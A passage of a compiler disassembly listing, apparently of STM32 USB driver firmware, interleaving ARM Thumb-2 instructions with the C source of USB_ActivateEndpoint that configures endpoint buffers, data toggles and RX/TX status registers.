 80060fa:	881b      	ldrh	r3, [r3, #0]
 80060fc:	b29b      	uxth	r3, r3
 80060fe:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006102:	b29a      	uxth	r2, r3
 8006104:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006106:	801a      	strh	r2, [r3, #0]
 8006108:	683b      	ldr	r3, [r7, #0]
 800610a:	691b      	ldr	r3, [r3, #16]
 800610c:	2b3e      	cmp	r3, #62	; 0x3e
 800610e:	d91d      	bls.n	800614c <USB_ActivateEndpoint+0x2b0>
 8006110:	683b      	ldr	r3, [r7, #0]
 8006112:	691b      	ldr	r3, [r3, #16]
 8006114:	095b      	lsrs	r3, r3, #5
 8006116:	66bb      	str	r3, [r7, #104]	; 0x68
 8006118:	683b      	ldr	r3, [r7, #0]
 800611a:	691b      	ldr	r3, [r3, #16]
 800611c:	f003 031f 	and.w	r3, r3, #31
 8006120:	2b00      	cmp	r3, #0
 8006122:	d102      	bne.n	800612a <USB_ActivateEndpoint+0x28e>
 8006124:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006126:	3b01      	subs	r3, #1
 8006128:	66bb      	str	r3, [r7, #104]	; 0x68
 800612a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800612c:	881b      	ldrh	r3, [r3, #0]
 800612e:	b29a      	uxth	r2, r3
 8006130:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006132:	b29b      	uxth	r3, r3
 8006134:	029b      	lsls	r3, r3, #10
 8006136:	b29b      	uxth	r3, r3
 8006138:	4313      	orrs	r3, r2
 800613a:	b29b      	uxth	r3, r3
 800613c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006140:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006144:	b29a      	uxth	r2, r3
 8006146:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006148:	801a      	strh	r2, [r3, #0]
 800614a:	e026      	b.n	800619a <USB_ActivateEndpoint+0x2fe>
 800614c:	683b      	ldr	r3, [r7, #0]
 800614e:	691b      	ldr	r3, [r3, #16]
 8006150:	2b00      	cmp	r3, #0
 8006152:	d10a      	bne.n	800616a <USB_ActivateEndpoint+0x2ce>
 8006154:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006156:	881b      	ldrh	r3, [r3, #0]
 8006158:	b29b      	uxth	r3, r3
 800615a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800615e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006162:	b29a      	uxth	r2, r3
 8006164:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006166:	801a      	strh	r2, [r3, #0]
 8006168:	e017      	b.n	800619a <USB_ActivateEndpoint+0x2fe>
 800616a:	683b      	ldr	r3, [r7, #0]
 800616c:	691b      	ldr	r3, [r3, #16]
 800616e:	085b      	lsrs	r3, r3, #1
 8006170:	66bb      	str	r3, [r7, #104]	; 0x68
 8006172:	683b      	ldr	r3, [r7, #0]
 8006174:	691b      	ldr	r3, [r3, #16]
 8006176:	f003 0301 	and.w	r3, r3, #1
 800617a:	2b00      	cmp	r3, #0
 800617c:	d002      	beq.n	8006184 <USB_ActivateEndpoint+0x2e8>
 800617e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006180:	3301      	adds	r3, #1
 8006182:	66bb      	str	r3, [r7, #104]	; 0x68
 8006184:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006186:	881b      	ldrh	r3, [r3, #0]
 8006188:	b29a      	uxth	r2, r3
 800618a:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800618c:	b29b      	uxth	r3, r3
 800618e:	029b      	lsls	r3, r3, #10
 8006190:	b29b      	uxth	r3, r3
 8006192:	4313      	orrs	r3, r2
 8006194:	b29a      	uxth	r2, r3
 8006196:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006198:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800619a:	687a      	ldr	r2, [r7, #4]
 800619c:	683b      	ldr	r3, [r7, #0]
 800619e:	781b      	ldrb	r3, [r3, #0]
 80061a0:	009b      	lsls	r3, r3, #2
 80061a2:	4413      	add	r3, r2
 80061a4:	881b      	ldrh	r3, [r3, #0]
 80061a6:	847b      	strh	r3, [r7, #34]	; 0x22
 80061a8:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 80061aa:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80061ae:	2b00      	cmp	r3, #0
 80061b0:	d01b      	beq.n	80061ea <USB_ActivateEndpoint+0x34e>
 80061b2:	687a      	ldr	r2, [r7, #4]
 80061b4:	683b      	ldr	r3, [r7, #0]
 80061b6:	781b      	ldrb	r3, [r3, #0]
 80061b8:	009b      	lsls	r3, r3, #2
 80061ba:	4413      	add	r3, r2
 80061bc:	881b      	ldrh	r3, [r3, #0]
 80061be:	b29b      	uxth	r3, r3
 80061c0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80061c4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061c8:	843b      	strh	r3, [r7, #32]
 80061ca:	687a      	ldr	r2, [r7, #4]
 80061cc:	683b      	ldr	r3, [r7, #0]
 80061ce:	781b      	ldrb	r3, [r3, #0]
 80061d0:	009b      	lsls	r3, r3, #2
 80061d2:	441a      	add	r2, r3
 80061d4:	8c3b      	ldrh	r3, [r7, #32]
 80061d6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80061da:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80061de:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80061e2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80061e6:	b29b      	uxth	r3, r3
 80061e8:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 80061ea:	683b      	ldr	r3, [r7, #0]
 80061ec:	781b      	ldrb	r3, [r3, #0]
 80061ee:	2b00      	cmp	r3, #0
 80061f0:	d124      	bne.n	800623c <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80061f2:	687a      	ldr	r2, [r7, #4]
 80061f4:	683b      	ldr	r3, [r7, #0]
 80061f6:	781b      	ldrb	r3, [r3, #0]
 80061f8:	009b      	lsls	r3, r3, #2
 80061fa:	4413      	add	r3, r2
 80061fc:	881b      	ldrh	r3, [r3, #0]
 80061fe:	b29b      	uxth	r3, r3
 8006200:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006204:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006208:	83bb      	strh	r3, [r7, #28]
 800620a:	8bbb      	ldrh	r3, [r7, #28]
 800620c:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006210:	83bb      	strh	r3, [r7, #28]
 8006212:	8bbb      	ldrh	r3, [r7, #28]
 8006214:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006218:	83bb      	strh	r3, [r7, #28]
 800621a:	687a      	ldr	r2, [r7, #4]
 800621c:	683b      	ldr	r3, [r7, #0]
 800621e:	781b      	ldrb	r3, [r3, #0]
 8006220:	009b      	lsls	r3, r3, #2
 8006222:	441a      	add	r2, r3
 8006224:	8bbb      	ldrh	r3, [r7, #28]
 8006226:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800622a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800622e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006232:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006236:	b29b      	uxth	r3, r3
 8006238:	8013      	strh	r3, [r2, #0]
 800623a:	e1ea      	b.n	8006612 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 800623c:	687a      	ldr	r2, [r7, #4]
 800623e:	683b      	ldr	r3, [r7, #0]
 8006240:	781b      	ldrb	r3, [r3, #0]
 8006242:	009b      	lsls	r3, r3, #2
 8006244:	4413      	add	r3, r2
 8006246:	881b      	ldrh	r3, [r3, #0]
 8006248:	b29b      	uxth	r3, r3
 800624a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800624e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006252:	83fb      	strh	r3, [r7, #30]
 8006254:	8bfb      	ldrh	r3, [r7, #30]
 8006256:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800625a:	83fb      	strh	r3, [r7, #30]
 800625c:	687a      	ldr	r2, [r7, #4]
 800625e:	683b      	ldr	r3, [r7, #0]
 8006260:	781b      	ldrb	r3, [r3, #0]
 8006262:	009b      	lsls	r3, r3, #2
 8006264:	441a      	add	r2, r3
 8006266:	8bfb      	ldrh	r3, [r7, #30]
 8006268:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800626c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006270:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006274:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006278:	b29b      	uxth	r3, r3
 800627a:	8013      	strh	r3, [r2, #0]
 800627c:	e1c9      	b.n	8006612 <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 800627e:	683b      	ldr	r3, [r7, #0]
 8006280:	78db      	ldrb	r3, [r3, #3]
 8006282:	2b02      	cmp	r3, #2
 8006284:	d11e      	bne.n	80062c4 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006286:	687a      	ldr	r2, [r7, #4]
 8006288:	683b      	ldr	r3, [r7, #0]
 800628a:	781b      	ldrb	r3, [r3, #0]
 800628c:	009b      	lsls	r3, r3, #2
 800628e:	4413      	add	r3, r2
 8006290:	881b      	ldrh	r3, [r3, #0]
 8006292:	b29b      	uxth	r3, r3
 8006294:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006298:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800629c:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 80062a0:	687a      	ldr	r2, [r7, #4]
 80062a2:	683b      	ldr	r3, [r7, #0]
 80062a4:	781b      	ldrb	r3, [r3, #0]
 80062a6:	009b      	lsls	r3, r3, #2
 80062a8:	441a      	add	r2, r3
 80062aa:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80062ae:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062b2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062b6:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 80062ba:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062be:	b29b      	uxth	r3, r3
 80062c0:	8013      	strh	r3, [r2, #0]
 80062c2:	e01d      	b.n	8006300 <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 80062c4:	687a      	ldr	r2, [r7, #4]
 80062c6:	683b      	ldr	r3, [r7, #0]
 80062c8:	781b      	ldrb	r3, [r3, #0]
 80062ca:	009b      	lsls	r3, r3, #2
 80062cc:	4413      	add	r3, r2
 80062ce:	881b      	ldrh	r3, [r3, #0]
 80062d0:	b29b      	uxth	r3, r3
 80062d2:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 80062d6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062da:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 80062de:	687a      	ldr	r2, [r7, #4]
 80062e0:	683b      	ldr	r3, [r7, #0]
 80062e2:	781b      	ldrb	r3, [r3, #0]
 80062e4:	009b      	lsls	r3, r3, #2
 80062e6:	441a      	add	r2, r3
 80062e8:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 80062ec:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062f0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062f4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80062f8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062fc:	b29b      	uxth	r3, r3
 80062fe:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 8006300:	687b      	ldr	r3, [r7, #4]
 8006302:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006304:	687b      	ldr	r3, [r7, #4]
 8006306:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800630a:	b29b      	uxth	r3, r3
 800630c:	461a      	mov	r2, r3
 800630e:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006310:	4413      	add	r3, r2
 8006312:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006314:	683b      	ldr	r3, [r7, #0]
 8006316:	781b      	ldrb	r3, [r3, #0]
 8006318:	00da      	lsls	r2, r3, #3
 800631a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800631c:	4413      	add	r3, r2
 800631e:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8006322:	65bb      	str	r3, [r7, #88]	; 0x58
 8006324:	683b      	ldr	r3, [r7, #0]
 8006326:	891b      	ldrh	r3, [r3, #8]
 8006328:	085b      	lsrs	r3, r3, #1
 800632a:	b29b      	uxth	r3, r3
 800632c:	005b      	lsls	r3, r3, #1
 800632e:	b29a      	uxth	r2, r3
 8006330:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8006332:	801a      	strh	r2, [r3, #0]
 8006334:	687b      	ldr	r3, [r7, #4]
 8006336:	657b      	str	r3, [r7, #84]	; 0x54
 8006338:	687b      	ldr	r3, [r7, #4]
 800633a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800633e:	b29b      	uxth	r3, r3
 8006340:	461a      	mov	r2, r3
 8006342:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006344:	4413      	add	r3, r2
 8006346:	657b      	str	r3, [r7, #84]	; 0x54
 8006348:	683b      	ldr	r3, [r7, #0]
 800634a:	781b      	ldrb	r3, [r3, #0]
 800634c:	00da      	lsls	r2, r3, #3
 800634e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006350:	4413      	add	r3, r2
 8006352:	f203 4304 	addw	r3, r3, #1028	; 0x404
 8006356:	653b      	str	r3, [r7, #80]	; 0x50
 8006358:	683b      	ldr	r3, [r7, #0]
 800635a:	895b      	ldrh	r3, [r3, #10]
 800635c:	085b      	lsrs	r3, r3, #1
 800635e:	b29b      	uxth	r3, r3
 8006360:	005b      	lsls	r3, r3, #1
 8006362:	b29a      	uxth	r2, r3
 8006364:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8006366:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 8006368:	683b      	ldr	r3, [r7, #0]
 800636a:	785b      	ldrb	r3, [r3, #1]
 800636c:	2b00      	cmp	r3, #0
 800636e:	f040 8093 	bne.w	8006498 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006372:	687a      	ldr	r2, [r7, #4]
 8006374:	683b      	ldr	r3, [r7, #0]
 8006376:	781b      	ldrb	r3, [r3, #0]
 8006378:	009b      	lsls	r3, r3, #2
 800637a:	4413      	add	r3, r2
 800637c:	881b      	ldrh	r3, [r3, #0]
 800637e:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 8006382:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8006386:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800638a:	2b00      	cmp	r3, #0
 800638c:	d01b      	beq.n	80063c6 <USB_ActivateEndpoint+0x52a>
 800638e:	687a      	ldr	r2, [r7, #4]
 8006390:	683b      	ldr	r3, [r7, #0]
 8006392:	781b      	ldrb	r3, [r3, #0]
 8006394:	009b      	lsls	r3, r3, #2
 8006396:	4413      	add	r3, r2
 8006398:	881b      	ldrh	r3, [r3, #0]
 800639a:	b29b      	uxth	r3, r3
 800639c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063a0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063a4:	87fb      	strh	r3, [r7, #62]	; 0x3e
 80063a6:	687a      	ldr	r2, [r7, #4]
 80063a8:	683b      	ldr	r3, [r7, #0]
 80063aa:	781b      	ldrb	r3, [r3, #0]
 80063ac:	009b      	lsls	r3, r3, #2
 80063ae:	441a      	add	r2, r3
 80063b0:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 80063b2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80063b6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80063ba:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80063be:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80063c2:	b29b      	uxth	r3, r3
 80063c4:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80063c6:	687a      	ldr	r2, [r7, #4]
 80063c8:	683b      	ldr	r3, [r7, #0]
 80063ca:	781b      	ldrb	r3, [r3, #0]
 80063cc:	009b      	lsls	r3, r3, #2
 80063ce:	4413      	add	r3, r2
 80063d0:	881b      	ldrh	r3, [r3, #0]
 80063d2:	87bb      	strh	r3, [r7, #60]	; 0x3c
 80063d4:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 80063d6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80063da:	2b00      	cmp	r3, #0
 80063dc:	d01b      	beq.n	8006416 <USB_ActivateEndpoint+0x57a>
 80063de:	687a      	ldr	r2, [r7, #4]
 80063e0:	683b      	ldr	r3, [r7, #0]
 80063e2:	781b      	ldrb	r3, [r3, #0]
 80063e4:	009b      	lsls	r3, r3, #2
 80063e6:	4413      	add	r3, r2
 80063e8:	881b      	ldrh	r3, [r3, #0]
 80063ea:	b29b      	uxth	r3, r3
 80063ec:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063f0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063f4:	877b      	strh	r3, [r7, #58]	; 0x3a
 80063f6:	687a      	ldr	r2, [r7, #4]
 80063f8:	683b      	ldr	r3, [r7, #0]
 80063fa:	781b      	ldrb	r3, [r3, #0]
 80063fc:	009b      	lsls	r3, r3, #2
 80063fe:	441a      	add	r2, r3
 8006400:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 8006402:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006406:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800640a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800640e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006412:	b29b      	uxth	r3, r3
 8006414:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8006416:	687a      	ldr	r2, [r7, #4]
 8006418:	683b      	ldr	r3, [r7, #0]
 800641a:	781b      	ldrb	r3, [r3, #0]
 800641c:	009b      	lsls	r3, r3, #2
 800641e:	4413      	add	r3, r2
 8006420:	881b      	ldrh	r3, [r3, #0]
 8006422:	b29b      	uxth	r3, r3
 8006424:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006428:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800642c:	873b      	strh	r3, [r7, #56]	; 0x38
 800642e:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006430:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006434:	873b      	strh	r3, [r7, #56]	; 0x38
 8006436:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006438:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800643c:	873b      	strh	r3, [r7, #56]	; 0x38
 800643e:	687a      	ldr	r2, [r7, #4]
 8006440:	683b      	ldr	r3, [r7, #0]
 8006442:	781b      	ldrb	r3, [r3, #0]
 8006444:	009b      	lsls	r3, r3, #2
 8006446:	441a      	add	r2, r3
 8006448:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 800644a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800644e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006452:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006456:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800645a:	b29b      	uxth	r3, r3
 800645c:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800645e:	687a      	ldr	r2, [r7, #4]
 8006460:	683b      	ldr	r3, [r7, #0]
 8006462:	781b      	ldrb	r3, [r3, #0]
 8006464:	009b      	lsls	r3, r3, #2
 8006466:	4413      	add	r3, r2
 8006468:	881b      	ldrh	r3, [r3, #0]
 800646a:	b29b      	uxth	r3, r3
 800646c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006470:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006474:	86fb      	strh	r3, [r7, #54]	; 0x36
 8006476:	687a      	ldr	r2, [r7, #4]
 8006478:	683b      	ldr	r3, [r7, #0]
 800647a:	781b      	ldrb	r3, [r3, #0]
 800647c:	009b      	lsls	r3, r3, #2
 800647e:	441a      	add	r2, r3
 8006480:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 8006482:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006486:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800648a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800648e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006492:	b29b      	uxth	r3, r3
 8006494:	8013      	strh	r3, [r2, #0]
 8006496:	e0bc      	b.n	8006612 <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006498:	687a      	ldr	r2, [r7, #4]
 800649a:	683b      	ldr	r3, [r7, #0]
 800649c:	781b      	ldrb	r3, [r3, #0]
 800649e:	009b      	lsls	r3, r3, #2
 80064a0:	4413      	add	r3, r2
 80064a2:	881b      	ldrh	r3, [r3, #0]
 80064a4:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80064a8:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80064ac:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80064b0:	2b00      	cmp	r3, #0
 80064b2:	d01d      	beq.n	80064f0 <USB_ActivateEndpoint+0x654>
 80064b4:	687a      	ldr	r2, [r7, #4]
 80064b6:	683b      	ldr	r3, [r7, #0]
 80064b8:	781b      	ldrb	r3, [r3, #0]
 80064ba:	009b      	lsls	r3, r3, #2
 80064bc:	4413      	add	r3, r2
 80064be:	881b      	ldrh	r3, [r3, #0]
 80064c0:	b29b      	uxth	r3, r3
 80064c2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80064c6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064ca:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 80064ce:	687a      	ldr	r2, [r7, #4]
 80064d0:	683b      	ldr	r3, [r7, #0]
 80064d2:	781b      	ldrb	r3, [r3, #0]
 80064d4:	009b      	lsls	r3, r3, #2
 80064d6:	441a      	add	r2, r3
 80064d8:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 80064dc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064e0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064e4:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80064e8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064ec:	b29b      	uxth	r3, r3
 80064ee:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80064f0:	687a      	ldr	r2, [r7, #4]
 80064f2:	683b      	ldr	r3, [r7, #0]
 80064f4:	781b      	ldrb	r3, [r3, #0]
 80064f6:	009b      	lsls	r3, r3, #2
 80064f8:	4413      	add	r3, r2
 80064fa:	881b      	ldrh	r3, [r3, #0]
 80064fc:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 8006500:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8006504:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006508:	2b00      	cmp	r3, #0
 800650a:	d01d      	beq.n	8006548 <USB_ActivateEndpoint+0x6ac>
 800650c:	687a      	ldr	r2, [r7, #4]
 800650e:	683b      	ldr	r3, [r7, #0]
 8006510:	781b      	ldrb	r3, [r3, #0]
 8006512:	009b      	lsls	r3, r3, #2
 8006514:	4413      	add	r3, r2
 8006516:	881b      	ldrh	r3, [r3, #0]
 8006518:	b29b      	uxth	r3, r3
 800651a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800651e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006522:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8006526:	687a      	ldr	r2, [r7, #4]
 8006528:	683b      	ldr	r3, [r7, #0]
 800652a:	781b      	ldrb	r3, [r3, #0]
 800652c:	009b      	lsls	r3, r3, #2
 800652e:	441a      	add	r2, r3
 8006530:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 8006534:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006538:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800653c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006540:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006544:	b29b      	uxth	r3, r3
 8006546:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006548:	683b      	ldr	r3, [r7, #0]
 800654a:	78db      	ldrb	r3, [r3, #3]
 800654c:	2b01      	cmp	r3, #1
 800654e:	d024      	beq.n	800659a <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006550:	687a      	ldr	r2, [r7, #4]
 8006552:	683b      	ldr	r3, [r7, #0]
 8006554:	781b      	ldrb	r3, [r3, #0]
 8006556:	009b      	lsls	r3, r3, #2
 8006558:	4413      	add	r3, r2
 800655a:	881b      	ldrh	r3, [r3, #0]
 800655c:	b29b      	uxth	r3, r3
 800655e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006562:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006566:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 800656a:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 800656e:	f083 0320 	eor.w	r3, r3, #32
 8006572:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006576:	687a      	ldr	r2, [r7, #4]
 8006578:	683b      	ldr	r3, [r7, #0]
 800657a:	781b      	ldrb	r3, [r3, #0]
 800657c:	009b      	lsls	r3, r3, #2
 800657e:	441a      	add	r2, r3
 8006580:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006584:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006588:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800658c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006590:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006594:	b29b      	uxth	r3, r3
 8006596:	8013      	strh	r3, [r2, #0]
 8006598:	e01d      	b.n	80065d6 <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800659a:	687a      	ldr	r2, [r7, #4]
 800659c:	683b      	ldr	r3, [r7, #0]
 800659e:	781b      	ldrb	r3, [r3, #0]
 80065a0:	009b      	lsls	r3, r3, #2
 80065a2:	4413      	add	r3, r2
 80065a4:	881b      	ldrh	r3, [r3, #0]
 80065a6:	b29b      	uxth	r3, r3
 80065a8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065ac:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80065b0:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 80065b4:	687a      	ldr	r2, [r7, #4]
 80065b6:	683b      	ldr	r3, [r7, #0]
 80065b8:	781b      	ldrb	r3, [r3, #0]
 80065ba:	009b      	lsls	r3, r3, #2
 80065bc:	441a      	add	r2, r3
 80065be:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 80065c2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065c6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065ca:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065ce:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065d2:	b29b      	uxth	r3, r3
 80065d4:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80065d6:	687a      	ldr	r2, [r7, #4]
 80065d8:	683b      	ldr	r3, [r7, #0]
